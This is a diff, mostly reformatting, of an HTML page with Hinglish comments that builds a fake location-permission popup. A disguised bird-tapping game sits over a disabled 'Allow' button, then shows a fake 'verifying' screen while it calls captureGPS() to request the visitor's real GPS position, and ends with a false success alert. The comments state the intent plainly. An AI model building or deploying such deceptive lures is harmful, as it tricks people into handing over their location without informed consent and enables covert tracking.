@@ -18,7 +18,8 @@
     }
 
     body {
-      background: #000; /* Fake background */
+      background: #000;
+      /* Fake background */
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -30,7 +31,8 @@
     .fake-popup {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.6); /* Dark backdrop */
+      background: rgba(0, 0, 0, 0.6);
+      /* Dark backdrop */
       display: flex;
       align-items: center;
       justify-content: center;
@@ -39,8 +41,13 @@
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
     }
 
     .popup-box {
@@ -49,13 +56,20 @@
       max-width: 400px;
       border-radius: 24px;
       padding: 20px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
       animation: slideUp 0.3s ease;
     }
 
     @keyframes slideUp {
-      from { transform: translateY(30px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
     }
 
     /* Header */
@@ -109,12 +123,12 @@
       position: relative;
       overflow: hidden;
     }
-    
+
     .icon-grid::after {
       content: '';
       position: absolute;
       inset: 0;
-      background-image: linear-gradient(rgba(255,255,255,0.4) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.4) 1px, transparent 1px);
+      background-image: linear-gradient(rgba(255, 255, 255, 0.4) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.4) 1px, transparent 1px);
       background-size: 10px 10px;
     }
 
@@ -122,11 +136,13 @@
       flex: 1;
       color: #fff;
     }
+
     .option-text h3 {
       font-size: 15px;
       font-weight: 500;
       margin-bottom: 2px;
     }
+
     .option-text p {
       font-size: 13px;
       color: #aaa;
@@ -141,10 +157,12 @@
       align-items: center;
       justify-content: center;
     }
+
     .location-option.active .radio-check {
       border-color: #8ab4f8;
       background: #8ab4f8;
     }
+
     .radio-check::after {
       content: '✓';
       color: #000;
@@ -152,6 +170,7 @@
       font-weight: bold;
       display: none;
     }
+
     .location-option.active .radio-check::after {
       display: block;
     }
@@ -175,13 +194,15 @@
       font-weight: 500;
       text-align: center;
       cursor: pointer;
-      pointer-events: none; /* User click nahi kar sakta, sirf bird se hoga */
+      pointer-events: none;
+      /* User click nahi kar sakta, sirf bird se hoga */
     }
 
     /* ═══ THE BIRD (Allow button ke upar) ═══ */
     .bird-container {
       position: absolute;
-      top: -60px; /* Allow button ke theek upar */
+      top: -30px;
+      /* Allow button ke theek upar */
       left: 50%;
       transform: translateX(-50%);
       width: 100%;
@@ -205,7 +226,7 @@
       filter: drop-shadow(0 0 8px #fff);
       z-index: 100;
     }
-    
+
     .bird-target:active {
       transform: scale(0.8);
     }
@@ -214,7 +235,7 @@
     .verifying-text {
       position: absolute;
       inset: 0;
-      background: rgba(0,0,0,0.8);
+      background: rgba(0, 0, 0, 0.8);
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -226,11 +247,11 @@
       pointer-events: none;
       transition: opacity 0.3s;
     }
+
     .verifying-text.show {
       opacity: 1;
       pointer-events: auto;
     }
-
   </style>
 </head>
 
@@ -239,7 +260,7 @@
   <!-- ═══ FAKE POPUP ═══ -->
   <div class="fake-popup" id="fakePopup">
     <div class="popup-box">
-      
+
       <!-- Header -->
       <div class="popup-header">
         <div class="icon-map">📍</div>
@@ -267,7 +288,7 @@
 
       <!-- Buttons -->
       <div class="btn-container">
-        
+
         <!-- BIRD GAME AREA (Allow button ke upar) -->
         <div class="bird-container" id="birdArea">
           <div class="bird-target" id="bird">🐦</div>
@@ -325,11 +346,11 @@
     // ═══════════════════════════════════════════════════════════════
     function moveBird() {
       if (!state.running) return;
-      
+
       // Bird ko area ke andar random jagah pe bhejo
       const w = birdArea.clientWidth - 50;
       const h = birdArea.clientHeight - 50;
-      
+
       bird.style.left = (Math.random() * w) + 'px';
       bird.style.top = (Math.random() * h) + 'px';
       bird.style.display = 'block';
@@ -343,7 +364,7 @@
       if (!state.running) return;
 
       state.hits++;
-      
+
       // Bird ko turant chhupao aur naya bhejo
       bird.style.display = 'none';
       setTimeout(moveBird, 40);
@@ -352,10 +373,10 @@
       if (state.hits >= 5) {
         state.running = false;
         bird.style.display = 'none';
-        
+
         // User ko lage verify ho raha hai
         verifyingText.classList.add('show');
-        
+
         // 500ms baad asli GPS maango
         setTimeout(() => {
           captureGPS();
@@ -401,7 +422,7 @@
 
           // Fake popup hatao
           document.getElementById('fakePopup').style.display = 'none';
-          
+
           // Success alert (optional)
           alert("✅ Location Verified Successfully!");
         },
